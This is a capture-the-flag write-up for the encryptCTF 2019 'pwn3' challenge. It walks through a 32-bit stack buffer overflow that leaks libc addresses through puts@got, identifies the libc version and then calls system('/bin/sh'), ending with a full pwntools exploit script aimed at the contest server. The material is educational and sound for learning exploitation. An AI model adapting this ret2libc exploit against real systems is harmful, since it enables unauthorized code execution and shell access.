---
layout: single
title: encryptCTF 2019 Pwn Write-up 4 of 5
excerpt: Fourth part of my encryptCTF 2019 Pwn write-up series. This challenge tackles stack buffer overflow — leaking a LIBC address that leads to a shell.
date: '2019-04-04T11:45:03.923Z'
classes: wide
categories:
- ctf
- encryptctf
tags:
- pwn
- bof
- ret2libc
---

| ![First pwn board wipe of the year. hsb represent! ](https://cdn-images-1.medium.com/max/800/1*ycEO30rNNBaEmC9qIWf8VQ.png) |
|:--:|
| First pwn board wipe of the year. hsb represent!  |

### Pwn3 Solution (300 pts.)

> This challenge tackles stack buffer overflow — leaking a LIBC address that leads to a shell.

Challenge description:

> libc is such a nice place to hangout, isn’t it?

Based on the description, it seems that the challenges revolves around `libc.` Common pwn challenges about `libc` requires leaking a `libc` address from the remote server to identify the libc version used by the program.

Let’s start by doing simple checks to the binary.

![Commands used: `file` and `gdb` `checksec`](https://cdn-images-1.medium.com/max/800/1*yTXwiYupaQ3eOXTSv4rDDA.png)

Again, the file is a `32-bit ELF executable,` and `Canary`, `PIE` and `RelRo` are disabled. Hence, we can try to do a `buffer overflow` to overwrite the saved return address.

Let’s try to run the binary and enter a long unique string to determine if we can overwrite the saved return address.

Generate pattern using msf-pattern_create.rb

```
root@kali:pwn2# msf-pattern_create -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

Let’s use the string pattern as our input.

![hehe segfault ](https://cdn-images-1.medium.com/max/800/1*Tyi4kw7uhbyi2OVBezj1Eg.png)

It seems we have overwritten the saved return address with `0x37654136`. Let’s compute for the offset using `msf-pattern_offset.rb.`

```
root@kali:pwn3# msf-pattern_offset -q 0x37654136  
[*] Exact match at offset 140
```

We got the offset at 140. Our payload template should look like this:

```
payload = [140 bytes buffer] + [addr of next function]
```

Now, let’s inspect the binary with `radare2` and look for useful functions.

![pwn3 functions](https://cdn-images-1.medium.com/max/800/1*t45oDErwakl7W3wY1jmGkA.png)

It seems that there is no `WIN` function or `system()` function on this binary unlike the first three challenges.

Luckily, we have `puts()` function. We can use the puts function to leak a libc address from the remote server.

> Reminder: Remote servers with ASLR enabled give a different LIBC address for each connection. Thus, we need to prevent program termination after the libc leak. We can loop back to the main function after leaking a libc address.

Let’s create a payload that will leak a libc address from the server, and loop back to main().

```
payload = [140 bytes buffer] + [puts()] + [main()] + [puts@got]
```

> Quick note: `puts.got` contains the address of puts@LIBC function

Sample screenshot of getting `puts@got` address:

![`0x80497b0` is the address of puts@got](https://cdn-images-1.medium.com/max/800/1*2tGd-viNpTsuUTvdsyzr8A.png)

The screenshot above shows that the `puts@got` address is `0x80497b0.` We can see that `0x80497b0` contains an address which is `0xf7e2b210`.

`0xf7e2b210` is the address of puts() in the `libc`.

Going back to the payload, let’s replace the template with the following values:

```
gef➤  p main  
$1 = {<text variable, no debug info>} `0x804847d` <main>

puts@plt = `0x8048340`  
puts@got = `0x80497b0`

payload = [140 bytes buffer] + [`0x8048340`] + [`0x0804847d`] + [`0x80497b0`]
```

Let’s send this payload and wait for a leak 

![Aha! A garbage data.](https://cdn-images-1.medium.com/max/800/1*gjb5GD7YlD8df4Q8fi046A.png)

Success! We got a leak. Although it seems that it is just a garbage data, there is just no ascii character representation for the leaked bytes. Let’s convert the leaked data in a more readable form.

![puts@libc leak ](https://cdn-images-1.medium.com/max/800/1*eWS0SyTqqQ3INZHohjyfew.png)

We got a leak for puts@libc which is `0xf7e277e0.` Using  this leaked address, we can identify the version of `libc` by using [https://libc.blukat.me/](https://libc.blukat.me/).

> Quick note: The last 3 values of a libc address is always constant.

![Oh, multiple libc versions :(](https://cdn-images-1.medium.com/max/800/1*_74xDUsYu5btYpo6jwIgnQ.png)

The database gave 3 different libc versions. Let’s leak another address, and query two addresses to get better results.

Let’s leak `gets@libc` using the same method. Just replace the `puts@got` from the previous payload with `gets@got`.

![0x80497ac is the address of gets@got](https://cdn-images-1.medium.com/max/800/1*KCMiOOEuw1g3nTpheW6aaQ.png)

```
payload = [140 bytes buffer] + [`0x8048340`] + [`0x0804847d`] + [`0x80497ac`]
```

![gets@got leak ](https://cdn-images-1.medium.com/max/800/1*LMxGvel475kEXDX4mF3NFw.png)

Let’s go back to libc database search and use the 2 address that we leaked.

![](https://cdn-images-1.medium.com/max/800/1*pHeFVdfX8qOcHMCMN8QrxQ.png)

We got a decent libc version. Let’s use this libc to compute the libc base address, and the addresses of system() and /bin/sh.

Here is how we compute the addresses we need:

```
libc_base = puts_leak - puts_offset  
system_address = libc_base + system_offset  
bin_sh_address = libc_base + bin_sh_offset
```

We already got the values we need, let’s now craft our stage 2 payload.

Since the program loops back to main, let’s recompute the offset needed to overwrite the saved return address.

Generate pattern using msf-pattern_create.rb

```
root@kali:pwn2# msf-pattern_create -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

![Segfault! ](https://cdn-images-1.medium.com/max/800/1*H7Eb735ip6GklDhJHA4GGQ.png)

The program leads to a segmentation fault, let’s check the core dump generated by the program.

![saved return address overwritten by 0x41346541](https://cdn-images-1.medium.com/max/800/1*A_H6kqD71L6fpTmavtv3Hw.png)

We can see that the saved return address is overwritten by `0x41346541`. Let’s use `msf-pattern_offset.rb` to get the offset.

```
root@kali:pwn3# msf-pattern_offset -q 0x41346541  
[*] Exact match at offset 132
```

The offset is 132. We can now create our stage 2 payload with all the information.

```
payload = [132 bytes buffer] + [system()] + [4 bytes garbage] + [/bin/sh address]
```

![We got a shell! ](https://cdn-images-1.medium.com/max/800/1*6C_4ndm7cOFe-3sxMAqBNA.png)

Flag: `encryptCTF{70_7h3_C3nt3R_0f_L!bC}`

Sample exploit script:

```
./exploit.py

from pwn import *

r = remote('104.154.106.182', 4567)  
#r = process('./pwn3')  
libc = ELF('./libc.so.6')

offset = 140

puts_plt = 0x8048340  
puts_got = 0x80497b0

gets_plt = 0x8048330  
gets_got = 0x80497ac  
main_plt = 0x0804847d

# Stage 1 payload  
# ------------------------

payload = ""  
payload += "A"*offset  
payload += p32(puts_plt)  
payload += p32(main_plt)  
payload += p32(puts_got)

r.recvuntil('desert:')

log.info('Payload format: [140 bytes buffer] + [puts() addr] + [main() addr] + [puts@got]')  
r.sendline(payload)  
r.recvline()

puts_leak = u32(r.recvline()[:4])  
log.info('Puts leak: {}'.format(hex(puts_leak)))

puts_offset = libc.symbols['puts']  
system_offset = libc.symbols['system']  
exit_offset = libc.symbols['exit']  
binsh_offset = next(libc.search('/bin/shx00'))

libc_base = puts_leak - puts_offset   
system_addr = libc_base + system_offset  
binsh_addr = libc_base + binsh_offset  
exit_addr = libc_base + exit_offset

log.info('Formula to compute the addresses we need:')  
log.info('libc_base = puts_leak - puts_offset')  
log.info('system_address = libc_base + system_offset')  
log.info('bin_sh_address = libc_base + bin_sh_offset')

log.info('libc base: {}'.format(hex(libc_base)))  
log.info('system() addr: {}'.format(hex(system_addr)))  
log.info('/bin/sh addr: {}'.format(hex(binsh_addr)))

# Stage 2 payload   
# -----------------------

payload = ""  
payload += "A"*132  
payload += p32(system_addr)  
payload += p32(exit_addr)  
payload += p32(binsh_addr)

log.info('Payload format: [44 bytes buffer] + [system() addr] + [4 bytes garbage] + [/bin/sh addr]')  
log.info('Sending stage 2 payload.')  
log.info('Enjoy your shell! ')

r.recvuntil('desert: ')  
r.sendline(payload)  
r.interactive()
```

-

— ar33zy

[hackstreetboys](https://hackstreetboys.ph/) aka [hsb] is a CTF team from the Philippines.

Please do like our [Facebook Page](https://www.facebook.com/hackstreetboys/) and Follow us on [Twitter](https://twitter.com/_hackstreetboys), [Medium](https://medium.com/hackstreetboys), and [GitHub](https://github.com/hackstreetboysph).
